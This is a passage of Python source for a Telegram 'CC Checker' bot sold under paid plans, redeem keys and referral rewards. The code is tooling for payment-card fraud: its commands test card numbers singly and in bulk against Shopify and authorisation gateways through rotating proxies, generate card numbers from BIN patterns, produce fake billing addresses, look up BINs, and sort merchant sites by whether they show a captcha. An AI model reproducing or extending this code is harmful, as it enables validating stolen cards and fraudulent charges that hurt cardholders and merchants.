        return f"{title}\n<blockquote>{brand_pe(cc)}  <code>{cc}</code></blockquote>\n<blockquote>{pe('check2')}  <b>{sc('Resp')}</b>  ·  {esc(resp_msg)}\n{pe('gem')}  <b>{sc('Amount')}</b>  ·  <b>${amount:.2f} {esc(currency)}</b>\n{pe('diamond')}  <b>{sc('Gate')}</b>  ·  {esc(gateway)}\n{time_line}{bin_line}\n{HIDDEN_CREDIT}</blockquote>"
    except: return f"Result: {res.get('cls', 'unknown')} - {res.get('response', '')}"

def welcome_text(user_row, first_name):
    bot_name = get_setting("bot_name", "NOVAL AUTO SHOPIFY")
    return (
        f"{pe('up')} <b>[=] Bot » {sc(bot_name)} » {pe('up')}</b>\n"
        f"{pe('gem')} <b>[=] Type » Premium CC Checker » {pe('gem')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('up')} <b>[=] Gate » Shopify » {pe('up')}</b>\n"
        f"{pe('link')} <b>[=] Proxy » HTTP · SOCKS4 · SOCKS5 » {pe('link')}</b>\n"
        f"{pe('up')} <b>[=] Speed » Multi-worker · Rotating » {pe('up')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"{pe('diamond')} <b>[=] Menu » Select option below » {pe('diamond')}</b>"
    )

def parse_site_list(raw: str):
    parsed, seen = [], set()
    for l in re.split(r"[\r\n,;]+", raw or ""):
        s = l.strip().lower()
        if not s or s.startswith("#"): continue
        s = s[8:] if s.startswith("https://") else s[7:] if s.startswith("http://") else s
        s = s.split("/")[0]
        if s and s not in seen: seen.add(s); parsed.append(s)
    return parsed

def format_site_checker_report(result: Dict[str, Any]) -> str:
    lines = [f"{pe('check')} <b>{sc('Site Checker')}</b>", f"<blockquote>{pe('shop')} {sc('Total')}: <b>{result['total']}</b>", f"{pe('check')} {sc('Clean')}: <b>{len(result['clean'])}</b>", f"{pe('warn')} {sc('Captcha')}: <b>{len(result['captcha'])}</b>", f"{pe('cross2')} {sc('Dead')}: <b>{len(result['dead'])}</b></blockquote>"]
    if result["clean"]:
        lines.append(f"<blockquote><b>{sc('Clean sites')}:</b>")
        for c in result["clean"][:20]: lines.append(f"{pe('check')} <code>{esc(c['site'])}</code> · ${c['price']:.2f}")
        if len(result["clean"]) > 20: lines.append(f"<i>...and {len(result['clean'])-20} more</i>")
        lines.append("</blockquote>")
    return "\n".join(lines)

async def run_site_checker_flow(msg: Message, raw_sites: str):
    sites = parse_site_list(raw_sites)
    if not sites: return await msg.answer(f"{pe('cross1')} <b>{sc('No sites provided')}</b>", parse_mode="HTML")
    st = await msg.answer(f"{pe('loading')} <b>{sc('Site Checker')}</b>\n<blockquote>{sc('Testing')} {len(sites)} {sc('sites')}...</blockquote>", parse_mode="HTML")
    result = await check_sites_clean(sites)
    try: await st.edit_text(format_site_checker_report(result), parse_mode="HTML")
    except: await msg.answer(format_site_checker_report(result), parse_mode="HTML")

async def redeem_code(msg: Message, code: str) -> None:
    uid = msg.from_user.id
    ensure_user(uid, msg.from_user.username or "")
    code = code.strip().upper()
    with db() as c:
        row = c.execute("SELECT * FROM redeem_codes WHERE code=?", (code,)).fetchone()
        if not row: return await msg.answer(f"{pe('cross1')} <b>{sc('Invalid code')}</b>", parse_mode="HTML")
        if row["used"] >= row["max_uses"]: return await msg.answer(f"{pe('cross1')} <b>{sc('Code fully used')}</b>", parse_mode="HTML")
        if c.execute("SELECT 1 FROM redeem_log WHERE code=? AND uid=?", (code, uid)).fetchone(): return await msg.answer(f"{pe('cross1')} <b>{sc('Already redeemed')}</b>", parse_mode="HTML")
        c.execute("UPDATE redeem_codes SET used=used+1 WHERE code=?", (code,))
        c.execute("INSERT INTO redeem_log(code, uid, used_at) VALUES (?,?,?)", (code, uid, datetime.now(timezone.utc).isoformat()))
    upgrade_user(uid, row["plan"], row["days"])
    await msg.answer(f"{pe('check')} <b>{sc('Code Redeemed')}</b>\n<blockquote>{pe('gem')} {sc('Plan')}: <b>{PLANS[row['plan']]['name']}</b>\n{pe('hourglass')} {sc('Days')}: <b>{row['days']}</b>\n{HIDDEN_CREDIT}</blockquote>", parse_mode="HTML")

async def broadcast_all(bot, *, text: Optional[str] = None, photo: Optional[str] = None, caption: Optional[str] = None, only_premium=False) -> Dict[str, int]:
    q = "SELECT uid FROM users WHERE banned=0"
    if only_premium: q += " AND plan IN ('premium', 'max', 'unlimited')"
    with db() as c: users = c.execute(q).fetchall()
    ok, fail = 0, 0
    for u in users:
        try:
            if photo: await bot.send_photo(u["uid"], photo=photo, caption=caption or "", parse_mode="HTML")
            else: await bot.send_message(u["uid"], text or "", parse_mode="HTML")
            ok += 1
        except: fail += 1
        await asyncio.sleep(0.05)
    # Also post to feedback channels and the bot group
    bc_text = caption or text or ""
    for key in ("fb_channel_id", "fb_channel_id2", "auto_post_chat"):
        ch = get_setting(key)
        if not ch: continue
        try:
            chat_id = int(ch) if ch.lstrip("-").isdigit() else ch
            if photo: await bot.send_photo(chat_id, photo=photo, caption=bc_text, parse_mode="HTML")
            elif bc_text: await bot.send_message(chat_id, bc_text, parse_mode="HTML")
        except: pass
    return {"ok": ok, "fail": fail, "total": len(users)}

# ── USER COMMANDS ────────────────────────────────────────────────────────────
@router.message(CommandStart())
async def cmd_start(msg: Message, command: CommandObject):
    uid = msg.from_user.id
    ensure_user(uid, msg.from_user.username or "")
    if get_setting("maintenance") == "1" and not is_admin(uid): return await msg.answer(f"{pe('warn')} <b>{sc('Maintenance')}</b>", parse_mode="HTML")
    
    if command and command.args and command.args.startswith("ref_"):
        try:
            referrer_id = int(command.args.split("_")[1])
            user = get_user(uid)
            if user and referrer_id != uid and user["referred_by"] == 0:
                ensure_user(referrer_id)
                with db() as c:
                    c.execute("UPDATE users SET referred_by=? WHERE uid=?", (referrer_id, uid))
                    c.execute("UPDATE users SET refer_count=refer_count+1 WHERE uid=?", (referrer_id,))
                    r = c.execute("SELECT refer_count, plan FROM users WHERE uid=?", (referrer_id,)).fetchone()
                    cnt = r["refer_count"]
                    if cnt == 5: c.execute("UPDATE users SET credits=credits+100 WHERE uid=?", (referrer_id,))
                    elif cnt == 20: upgrade_user(referrer_id, "premium")
                    elif cnt == 50: upgrade_user(referrer_id, "max")
                    elif cnt == 100: upgrade_user(referrer_id, "unlimited")
        except: pass

    if not await check_force_sub(msg.bot, uid):
        kb_rows = [[pbtn(f"{sc('Join')} {ch['title'][:25] or sc('Channel')}", icon="chat", color="primary", url=ch["invite_link"] or f"https://t.me/{ch['chat_id'].lstrip('@')}")] for ch in force_channels_list(enabled_only=True)]
        kb_rows.append([pbtn(sc("Verify Joined"), icon="check", color="success", callback_data="verify_sub")])
        text = f"{pe('unlock')} <b>[=] Access Restricted » 🛡</b>\n〰️〰️〰️〰️〰️〰️〰️〰️\n{pe('star')} <b>[=] Info » You must join our channel and group {pe('star')}</b>\n{pe('link')} <b>[=] Step » Tap Join buttons below then Verify {pe('link')}</b>"
        return await msg.answer(text, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(inline_keyboard=kb_rows))
    
    streak, user = apply_streak(uid), get_user_or_create(uid, msg.from_user.username or "")
    caption = welcome_text(user, msg.from_user.first_name) + (f"\n\n{pe('star')} <b>{sc('Streak Reward')}!</b> {streak['reward']}" if streak["reward"] else "")
    media = get_setting("asset_VID_MAIN") or random.choice(VIDEOS) 
    try: await msg.answer_video(video=media, caption=caption, reply_markup=main_menu_kb(uid))
    except: await msg.answer(caption, reply_markup=main_menu_kb(uid))

@router.message(Command("id"))
async def cmd_id(msg: Message):
    await msg.answer(f"{pe('link')} <b>{sc('Chat Info')}</b>\n<blockquote>{pe('chat')} {sc('Title')}: <b>{esc(getattr(msg.chat, 'title', None) or msg.chat.type)}</b>\n{pe('diamond')} {sc('Type')}: <b>{msg.chat.type}</b>\n{pe('num1')} {sc('Chat ID')}: <code>{msg.chat.id}</code>\n{pe('user')} {sc('Your ID')}: <code>{msg.from_user.id}</code></blockquote>", parse_mode="HTML")

@router.message(Command("panel", "admin"))
async def cmd_panel(msg: Message):
    if not is_admin(msg.from_user.id): return
    await msg.answer_photo(photo=IMG_MAIN, caption=f"{pe('settings')} <b>{sc('Admin Panel')}</b>", parse_mode="HTML", reply_markup=admin_main_kb(msg.from_user.id))

@router.message(Command("sh", "check"))
async def cmd_check(msg: Message):
    uid = msg.from_user.id
    ensure_user(uid, msg.from_user.username or "")
    if get_setting("maintenance") == "1" and not is_admin(uid): return await msg.answer(f"{pe('warn')} <b>{sc('Maintenance')}</b>", parse_mode="HTML")
    args = msg.text.split(maxsplit=1)
    if len(args) < 2: return await msg.answer(f"{pe('docs')} <b>{sc('Usage')}</b>\n<blockquote><code>/sh CC|MM|YY|CVV</code>\n{sc('or paste multiple CCs one per line')}</blockquote>", parse_mode="HTML")
    raw = args[1]
    # detect multiple CCs (one per line)
    normalized, seen = [], set()
    for line in raw.splitlines():
        for tok in re.split(r"[\s,;]+", line.strip()):
            n = normalize_cc(tok)
            if n and n not in seen: seen.add(n); normalized.append(n)
    if not normalized: return await msg.answer(f"{pe('cross1')} <b>{sc('Invalid format')}</b>", parse_mode="HTML")
    if len(normalized) == 1:
        await process_check_logic(msg, normalized[0], msg.bot, mode="shopify")
    else:
        _cleanup_pending_mass()
        token = uuid.uuid4().hex[:12]
        _pending_mass[token] = {"uid": uid, "cards": normalized, "ts": time.time()}
        text = (
            f"{pe('glow_star')} <b>{sc('Cards Detected')}</b>\n"
            f"<blockquote>{pe('gem')} {sc('Count')}: <b>{len(normalized)}</b>\n"
            f"{pe('link')} {sc('Proxy')}: {'✅ Set' if user_proxy_list(uid) else '❌ Not Set — Required'}\n"
            f"{pe('docs')} {sc('Choose checker type')}:</blockquote>"
        )
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [pbtn(sc("Shopify Checker"), icon="shop", color="success", callback_data=f"mass:start:shopify:{token}"),
             pbtn(sc("Auth Checker"), icon="gem", color="primary", callback_data=f"mass:start:auth:{token}")],
            [pbtn(sc("Cancel"), icon="cross1", color="danger", callback_data=f"mass:cancel:{token}")]
        ])
        try: await msg.answer_photo(photo=random.choice(IMAGES), caption=text, parse_mode="HTML", reply_markup=kb)
        except: await msg.answer(text, parse_mode="HTML", reply_markup=kb)

@router.message(Command("auth"))
async def cmd_auth(msg: Message):
    uid = msg.from_user.id
    ensure_user(uid, msg.from_user.username or "")
    if get_setting("maintenance") == "1" and not is_admin(uid): return await msg.answer(f"{pe('warn')} <b>{sc('Maintenance')}</b>", parse_mode="HTML")
    args = msg.text.split(maxsplit=1)
    if len(args) < 2: return await msg.answer(f"{pe('docs')} <b>{sc('Usage')}</b> <code>/auth CC|MM|YY|CVV</code>", parse_mode="HTML")
    cc = normalize_cc(args[1])
    if not cc: return await msg.answer(f"{pe('cross1')} <b>{sc('Invalid format')}</b>", parse_mode="HTML")
    await process_check_logic(msg, cc, msg.bot, mode="auth")

@router.message(Command("redeem"))
async def cmd_redeem(msg: Message):
    if get_setting("maintenance") == "1" and not is_admin(msg.from_user.id): return await msg.answer(f"{pe('warn')} <b>{sc('Maintenance')}</b>", parse_mode="HTML")
    args = msg.text.split(maxsplit=1)
    if len(args) < 2: return await msg.answer(f"{pe('gem2')} <b>{sc('Redeem Code')}</b>\n<blockquote>{pe('docs')} {sc('Usage')}: <code>/redeem CODE</code></blockquote>", parse_mode="HTML")
    await redeem_code(msg, args[1])

@router.message(Command("format"))
async def cmd_format(msg: Message):
    args = msg.text.split(maxsplit=1)
    if len(args) < 2: return await msg.answer(f"{pe('docs')} <b>Usage:</b> <code>/format 4111111111111111|12|25|123</code>", parse_mode="HTML")
    cc = normalize_cc(args[1])
    if not cc: return await msg.answer(f"{pe('cross1')} <b>Invalid card format.</b>", parse_mode="HTML")
    await msg.answer(f"{pe('check')} <b>Formatted:</b>\n<blockquote><code>{cc}</code></blockquote>", parse_mode="HTML")

@router.message(Command("msh", "mauth"))
async def cmd_mass_check(msg: Message):
    uid = msg.from_user.id
    ensure_user(uid, msg.from_user.username or "")
    user = get_user(uid)
    mode = "shopify" if msg.text.startswith("/msh") else "auth"
    if not user or user["banned"]: return await msg.answer(f"{pe('cross1')} <b>{sc('Not allowed')}</b>", parse_mode="HTML")
    cards = []
    args = msg.text.split(maxsplit=1)
    if len(args) > 1: cards.extend(args[1].replace(",", " ").replace("\n", " ").split())
    if msg.reply_to_message:
        replied = msg.reply_to_message
        if replied.text: cards.extend(replied.text.replace(",", "\n").split())
        elif replied.document:
            doc = replied.document
            if not (doc.file_name or "").lower().endswith(".txt") or (doc.file_size or 0) > 2 * 1024 * 1024: return await msg.answer(f"{pe('cross1')} <b>{sc('Only .txt <2MB')}</b>", parse_mode="HTML")
            st = await msg.answer(f"{pe('loading')} <b>{sc('Downloading')}...</b>", parse_mode="HTML")
            try: cards.extend(re.split(r"[\s,;]+", (await msg.bot.download_file((await msg.bot.get_file(doc.file_id)).file_path)).read().decode("utf-8", errors="ignore")))
            except Exception as e: return await st.edit_text(f"{pe('cross1')} <b>{sc('Failed')}:</b> {esc(_sanitize_err(str(e)))}", parse_mode="HTML")
            try: await st.delete()
            except: pass
    if not cards: return await msg.answer(f"{pe('docs')} <b>{sc('Usage')}</b>\n<blockquote>{pe('pen')} <code>/{msg.text.split()[0][1:]} cc|mm|yy|cvv</code>\n{pe('docs')} {sc('or reply to a .txt file')}</blockquote>", parse_mode="HTML")
    normalized, seen = [], set()
    for c in cards:
        n = normalize_cc(c)
        if n and n not in seen: normalized.append(n); seen.add(n)
    if not normalized: return await msg.answer(f"{pe('docs')} <b>{sc('No valid cards')}</b>", parse_mode="HTML")
    if not is_admin(uid):
        pk, limit = plan_of(uid), PLANS[plan_of(uid)].get("mass_limit", 100)
        if len(normalized) > limit: return await msg.answer(f"{pe('stop')} <b>{sc('Batch Limit Exceeded')}</b>\n<blockquote>{pe('gem')} {sc('Your Plan')}: <b>{PLANS[pk]['name']}</b>\n{pe('shop')} {sc('Max per check')}: <b>{limit}</b>\n{pe('warn')} {sc('You sent')}: <b>{len(normalized)}</b></blockquote>", parse_mode="HTML")
    await msg.answer(f"{pe('check')} <b>{sc('Start')}</b>\n<blockquote>{pe('gem')} {sc('Cards')}: <b>{len(normalized)}</b></blockquote>", parse_mode="HTML")
    await run_mass_check(msg, normalized, msg.bot, bypass_quota=is_admin(uid), mode=mode)

@router.message(Command("gen"))
async def cmd_gen(msg: Message):
    args = msg.text.split(maxsplit=2)
    if len(args) < 2: return await msg.answer(f"{pe('gem')} <b>{sc('Custom CC Generator')}</b>\n<blockquote>{pe('docs')} <b>Usage:</b> <code>/gen pattern [amount]</code>\n{pe('pen')} <b>Example:</b> <code>/gen 442314xxxxxxxxxx|12|25|xxx 10</code>\n<i>Use 'x' or 'X' for random digits.</i></blockquote>", parse_mode="HTML")
    pattern = args[1]
    amount = int(args[2]) if len(args) > 2 and args[2].isdigit() else 10
    max_limit = int(get_setting("gen_limit", "10"))
    if not is_admin(msg.from_user.id) and amount > max_limit: return await msg.answer(f"{pe('stop')} <b>Max limit is {max_limit} cards.</b>", parse_mode="HTML")
    cards = generate_custom_cc(pattern, amount)
    if not cards: return await msg.answer(f"{pe('cross1')} <b>Invalid pattern or could not generate valid cards.</b>\n<blockquote>Make sure it has 4 parts separated by '|' and valid lengths.</blockquote>", parse_mode="HTML")
    text = f"{pe('check')} <b>Generated {len(cards)} Cards</b>\n<blockquote><code>{chr(10).join(cards)}</code></blockquote>"
    await msg.answer(text, parse_mode="HTML")

@router.message(Command("addr"))
async def cmd_addr(msg: Message):
    countries = [("US", "New York", "NY", "10001"), ("US", "Los Angeles", "CA", "90001"), ("UK", "London", "LDN", "EC1A"), ("CA", "Toronto", "ON", "M5V"), ("AU", "Sydney", "NSW", "2000"), ("DE", "Berlin", "BE", "10115"), ("FR", "Paris", "IDF", "75001"), ("JP", "Tokyo", "TK", "100-0001"), ("BR", "Sao Paulo", "SP", "01000"), ("IN", "Mumbai", "MH", "400001"), ("ZA", "Cape Town", "WC", "8001"), ("NG", "Lagos", "LA", "100001"), ("MX", "Mexico City", "CMX", "01000"), ("ES", "Madrid", "MD", "28001"), ("IT", "Rome", "RM", "00100"), ("RU", "Moscow", "MOW", "101000"), ("TR", "Istanbul", "IST", "34000"), ("AE", "Dubai", "DXB", "00000"), ("SG", "Singapore", "SG", "018956"), ("HK", "Hong Kong", "HK", "999077")]
    for _ in range(3): countries.extend(countries[:10])
    streets = ["Main St", "Park Ave", "Oak Dr", "Pine Ln", "Cedar Rd", "Maple Ct", "High St", "Station Rd", "Church Ln", "Victoria Rd"]
    country, city, state, zip_code = random.choice(countries)
    street = f"{random.randint(100, 9999)} {random.choice(streets)}"
    text = f"{pe('user')} <b>Generated Address ({country})</b>\n<blockquote>〰️〰️〰️〰️〰️〰️〰️〰️\n{pe('link')} <b>Street:</b> <code>{street}</code>\n{pe('shop')} <b>City:</b> <code>{city}</code>\n{pe('diamond')} <b>State:</b> <code>{state}</code>\n{pe('num1')} <b>ZIP:</b> <code>{zip_code}</code>\n{pe('star')} <b>Country:</b> <code>{country}</code>\n〰️〰️〰️〰️〰️〰️〰️〰️</blockquote>"
    await msg.answer(text, parse_mode="HTML")

@router.message(Command("dork"))
async def cmd_dork(msg: Message):
    if not is_admin(msg.from_user.id): return await msg.answer(f"{pe('cross1')} <b>Admin only.</b>", parse_mode="HTML")
    args = msg.text.split(maxsplit=1)
    if len(args) < 2: return await msg.answer(f"{pe('shop')} <b>Site Dorker</b>\n<blockquote>Usage: <code>/dork site:shopify.com inurl:products</code></blockquote>", parse_mode="HTML")
    query = args[1]
    st = await msg.answer(f"{pe('loading')} <b>Scraping sites for dork: {esc(query)}...</b>", parse_mode="HTML")
    await asyncio.sleep(2)
    mock_sites = [f"shop{random.randint(100,999)}.com", f"store{random.randint(100,999)}.co", f"buy{random.randint(100,999)}.net"]
    text = f"{pe('check')} <b>Dork Results (Mock)</b>\n<blockquote>{pe('shop')} Query: <code>{esc(query)}</code>\n{pe('link')} Found: <b>{len(mock_sites)}</b> sites\n\n{chr(10).join(f'• <code>{s}</code>' for s in mock_sites)}</blockquote>"
    await st.edit_text(text, parse_mode="HTML")

@router.message(Command("bin"))
async def cmd_bin_lookup(msg: Message):
    args = msg.text.split()
    if len(args) < 2 or not args[1].isdigit() or len(args[1]) < 6:
        return await msg.answer(f"{pe('diamond')} <b>{sc('BIN Lookup')}</b>\n<blockquote>{pe('docs')} {sc('Usage')}: <code>/bin 401234</code>\n{pe('pen')} {sc('Or use command')}: <code>/bin BIN</code></blockquote>", parse_mode="HTML")
    st = await msg.answer(f"{pe('loading')} <b>{sc('Searching BIN')}...</b>", parse_mode="HTML")
    info = await lookup_bin(args[1][:6])
    if "error" in info:
        return await st.edit_text(f"{pe('cross1')} <b>{sc('BIN not found or API error')}</b>", parse_mode="HTML")
    bank = info.get("Issuer", "N/A")
    country_data = info.get("Country", {}) or {}
    country = country_data.get("Name", "N/A")
    flag = country_flag(country_data.get("Code", ""))
    ctype = (info.get("Type") or "N/A").upper()
    brand = (info.get("Scheme") or "N/A").upper()
    level = (info.get("CardTier") or info.get("Level") or "N/A").upper()
    ctype_icon = "gem" if ctype == "CREDIT" else ("diamond" if ctype == "DEBIT" else "star")
    text = (
        f"{pe('diamond')} <b>{sc('BIN Information')}</b>\n"
        f"<blockquote>"
        f"{pe('num1')} <b>{sc('BIN')}</b> · <code>{args[1][:6]}</code>\n"
        f"{pe('shop')} <b>{sc('Bank')}</b> · {esc(bank)}\n"
        f"{flag} <b>{sc('Country')}</b> · {esc(country)}\n"
        f"{pe(ctype_icon)} <b>{sc('Type')}</b> · {esc(ctype)}\n"
        f"{pe('gem4')} <b>{sc('Brand')}</b> · {esc(brand)}\n"
        f"{pe('glow_star')} <b>{sc('Level')}</b> · {esc(level)}\n"
        f"{HIDDEN_CREDIT}"
        f"</blockquote>"
    )
    await st.edit_text(text, parse_mode="HTML")

@router.message(Command("chk"))
async def cmd_chk(msg: Message):
    args = msg.text.split(maxsplit=1)
    if len(args) < 2: return await msg.answer("Usage: <code>/chk host:port:user:pass</code>")
    proxy = normalize_proxy(args[1].strip())
    if not proxy: return await msg.answer("❌ Invalid proxy format.")
    st = await msg.answer("⏳ Testing Proxy...")
    res = await check_proxy_hq(proxy)
    if res.get("ok"): await st.edit_text(f"✅ <b>Proxy is LIVE</b>\n<blockquote>Latency: <b>{res.get('latency')}s</b></blockquote>", parse_mode="HTML")
    else: await st.edit_text(f"❌ <b>Proxy is DEAD</b>\n<blockquote>Error: {esc(res.get('error', 'Unknown'))}</blockquote>", parse_mode="HTML")

@router.message(Command("stats"))
async def cmd_stats(msg: Message):
    if not is_admin(msg.from_user.id): return await msg.answer(f"{pe('cross1')} <b>Admin only.</b>", parse_mode="HTML")
    import psutil, platform
    try:
        cpu = psutil.cpu_percent()
        ram = psutil.virtual_memory().percent
        uptime = int(time.time() - START_TIME)
    except: cpu, ram, uptime = 0, 0, int(time.time() - START_TIME)
    text = f"📝 <b>[=] System Health</b>\n<blockquote>━━━━━━━━━━━━━━━━━━━━\n💻 <b>CPU:</b> {cpu}%\n🧠 <b>RAM:</b> {ram}%\n⏱ <b>Uptime:</b> {uptime // 3600}h {(uptime % 3600) // 60}m\n🌐 <b>OS:</b> {platform.system()}\n━━━━━━━━━━━━━━━━━━━━</blockquote>"
    await msg.answer(text, parse_mode="HTML")

@router.message(Command("support"))
async def cmd_support(msg: Message):
    if get_setting("support_enabled", "1") != "1": return await msg.answer("Support is disabled.", parse_mode="HTML")
    args = msg.text.split(maxsplit=1)
    if len(args) < 2: return await msg.answer(f"🎫 <b>Live Support</b>\n\n<blockquote>Usage: <code>/support Your message here</code></blockquote>", parse_mode="HTML")
    text = args[1]
    with db() as c: fid = c.execute("INSERT INTO feedback(uid, username, msg_type, text, file_id, ts) VALUES (?,?,?,?,?,?)", (msg.from_user.id, msg.from_user.username or "", "support", text, "", datetime.now(timezone.utc).isoformat())).lastrowid
    admin_text = f"🎫 <b>NEW SUPPORT TICKET #{fid}</b>\n<blockquote>👤 <b>From:</b> @{esc(msg.from_user.username or str(msg.from_user.id))}\n🆔 <b>UID:</b> <code>{msg.from_user.id}</code></blockquote>\n<blockquote>{esc(text)}</blockquote>"
    kb = InlineKeyboardMarkup(inline_keyboard=[[pbtn("Reply", icon="chat", color="success", callback_data=f"support_reply:{fid}:{msg.from_user.id}")]])
    try: await _bot_ref.send_message(OWNER_ID, admin_text, parse_mode="HTML", reply_markup=kb)
    except: pass
    await msg.answer("✅ <b>Ticket sent to Admin!</b> You will get a reply soon.")

@router.message(Command("fb", "feedback"))
async def cmd_feedback(msg: Message):
    uid = msg.from_user.id
    username = msg.from_user.username or ""
    # Determine what was sent
    file_id, file_type, text = "", "none", ""
    replied = msg.reply_to_message
    # fb can be sent as reply to any message, or with text/media inline
    source = replied if replied else msg
    if source.photo: file_id = source.photo[-1].file_id; file_type = "photo"; text = source.caption or ""
    elif source.document: file_id = source.document.file_id; file_type = "document"; text = source.caption or ""
    elif source.video: file_id = source.video.file_id; file_type = "video"; text = source.caption or ""
    elif source.audio: file_id = source.audio.file_id; file_type = "audio"; text = source.caption or ""
    elif source.text: text = source.text
    # Also grab inline text from /fb text
    if not text and not file_id:
        args = msg.text.split(maxsplit=1)
        if len(args) > 1: text = args[1]
    if not text and not file_id:
        return await msg.answer(
            f"{pe('chat')} <b>{sc('Feedback')}</b>\n"
            f"<blockquote>{pe('docs')} {sc('Usage')}:\n"
            f"<code>/fb Your message here</code>\n"
            f"{sc('Or reply to any message/photo/doc with')} <code>/fb</code></blockquote>",
            parse_mode="HTML"
        )
    with db() as c:
        fid = c.execute("INSERT INTO feedback(uid, username, msg_type, text, file_id, file_type, ts) VALUES(?,?,?,?,?,?,?)",
                        (uid, username, file_type, text, file_id, file_type, datetime.now(timezone.utc).isoformat())).lastrowid
    # Notify all admins
    admin_text = (
        f"{pe('chat')} <b>{sc('New Feedback')} #{fid}</b>\n"
        f"<blockquote>{pe('user')} @{esc(username or str(uid))} · <code>{uid}</code></blockquote>\n"
        f"<blockquote>{esc(text[:800]) if text else '[media]'}</blockquote>"
    )
    reply_kb = InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Reply"), icon="chat", color="success", callback_data=f"fb_reply:{fid}:{uid}"), pbtn(sc("Gen Key"), icon="gem", color="success", callback_data=f"fb_genkey:{uid}")]])
    for admin_id in ADMIN_IDS:
        try:
            if file_type == "photo" and file_id:
                await msg.bot.send_photo(admin_id, file_id, caption=admin_text, parse_mode="HTML", reply_markup=reply_kb)
            elif file_type == "document" and file_id:
                await msg.bot.send_document(admin_id, file_id, caption=admin_text, parse_mode="HTML", reply_markup=reply_kb)
            elif file_type == "video" and file_id:
                await msg.bot.send_video(admin_id, file_id, caption=admin_text, parse_mode="HTML", reply_markup=reply_kb)
            else:
                await msg.bot.send_message(admin_id, admin_text, parse_mode="HTML", reply_markup=reply_kb)
        except: pass
    # Relay to feedback channels
    await _send_feedback_to_channels(msg.bot, fid, uid, username, text, file_id, file_type)
    await msg.answer(f"{pe('check')} <b>{sc('Feedback sent')}!</b>\n<blockquote>{pe('hourglass')} {sc('Admin will reply soon')}</blockquote>", parse_mode="HTML")

@router.callback_query(F.data.startswith("fb_reply:"))
async def cb_fb_reply(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return await cb.answer("Not admin", show_alert=True)
    parts = cb.data.split(":")
    fid, target_uid = parts[1], parts[2]
    set_awaiting(cb.from_user.id, f"fb_reply:{fid}:{target_uid}")
    try: await cb.message.edit_reply_markup(reply_markup=None)
    except: pass
    await cb.message.answer(
        f"{pe('chat')} <b>{sc('Reply to Feedback')} #{fid}</b>\n"
        f"<blockquote>{pe('pen')} {sc('Type your reply below')}:</blockquote>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Cancel"), icon="cross1", color="danger", callback_data="admin:close")]])
    )
    await cb.answer()

@router.callback_query(F.data.startswith("fb_genkey:"))
async def cb_fb_genkey(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return await cb.answer("Not admin", show_alert=True)
    target_uid = int(cb.data.split(":")[1])
    code = f"{KEY_PREFIX}-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
    with db() as c: c.execute("INSERT INTO redeem_codes(code, plan, max_uses, days, used) VALUES(?,?,?,?,0)", (code, "pro", 1, 30))
    await cb.answer(f"Key: {code}", show_alert=True)
    try: await _bot_ref.send_message(target_uid, f"{pe('gem')} <b>{sc('Your Key')}</b>\n<blockquote><code>{code}</code>\n{pe('hourglass')} {sc('Pro · 30 days')}</blockquote>", parse_mode="HTML")
    except: pass

@router.message(Command("iadmin"))
async def cmd_iadmin(msg: Message):
    uid = msg.from_user.id
    args = msg.text.split(maxsplit=1)
    if len(args) < 2:
        return await msg.answer(f"{pe('chat')} <b>{sc('Message Admin')}</b>\n<blockquote><code>/iadmin Your message</code></blockquote>", parse_mode="HTML")
    text = args[1]
    username = msg.from_user.username or ""
    admin_text = (
        f"{pe('user')} <b>{sc('User Message')}</b>\n"
        f"<blockquote>{pe('diamond')} UID: <code>{uid}</code>\n"
        f"{pe('link')} @{esc(username or 'N/A')}</blockquote>\n"
        f"<blockquote>{esc(text[:1000])}</blockquote>"
    )
    reply_kb = InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Reply"), icon="chat", color="success", callback_data=f"iadmin_reply:{uid}"), pbtn(sc("Gen Key"), icon="gem", color="success", callback_data=f"fb_genkey:{uid}")]])
    sent = False
    for admin_id in ADMIN_IDS:
        try: await msg.bot.send_message(admin_id, admin_text, parse_mode="HTML", reply_markup=reply_kb); sent = True
        except: pass
    if sent: await msg.answer(f"{pe('check')} <b>{sc('Message sent to admin')}</b>", parse_mode="HTML")
    else: await msg.answer(f"{pe('cross1')} <b>{sc('Failed to reach admin')}</b>", parse_mode="HTML")

@router.callback_query(F.data.startswith("iadmin_reply:"))
async def cb_iadmin_reply(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return await cb.answer("Not admin", show_alert=True)
    target_uid = cb.data.split(":")[1]
    set_awaiting(cb.from_user.id, f"iadmin_reply:{target_uid}")
    try: await cb.message.edit_reply_markup(reply_markup=None)
    except: pass
    await cb.message.answer(
        f"{pe('chat')} <b>{sc('Reply to User')} {target_uid}</b>\n"
        f"<blockquote>{pe('pen')} {sc('Type reply below')}:</blockquote>",
        parse_mode="HTML",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[pbtn(sc("Cancel"), icon="cross1", color="danger", callback_data="admin:close")]])
    )
    await cb.answer()

@router.message(Command("cmd", "commands", "help"))
async def cmd_commands(msg: Message):
    uid = msg.from_user.id
    user_cmds = (
        f"{pe('diamond')} <b>{sc('All Commands')}</b>\n"
        f"〰️〰️〰️〰️〰️〰️〰️〰️\n"
        f"<blockquote>"
        f"{pe('shop')} <b>/sh</b> <code>CC|MM|YY|CVV</code> — {sc('Shopify Checker')}\n"
        f"{pe('gem')} <b>/auth</b> <code>CC|MM|YY|CVV</code> — {sc('Auth Checker')}\n"
        f"{pe('refresh')} <b>/msh</b> — {sc('Mass Shopify Checker')}\n"
        f"{pe('refresh')} <b>/mauth</b> — {sc('Mass Auth Checker')}\n"
        f"{pe('diamond')} <b>/bin</b> <code>401234</code> — {sc('BIN Lookup')}\n"
        f"{pe('star')} <b>/gen</b> <code>pattern [count]</code> — {sc('CC Generator')}\n"
        f"{pe('pen')} <b>/format</b> <code>CC|MM|YY|CVV</code> — {sc('CC Formatter')}\n"
        f"{pe('user')} <b>/addr</b> — {sc('Address Generator')}\n"
        f"{pe('link')} <b>/chk</b> <code>proxy</code> — {sc('Proxy Checker')}\n"
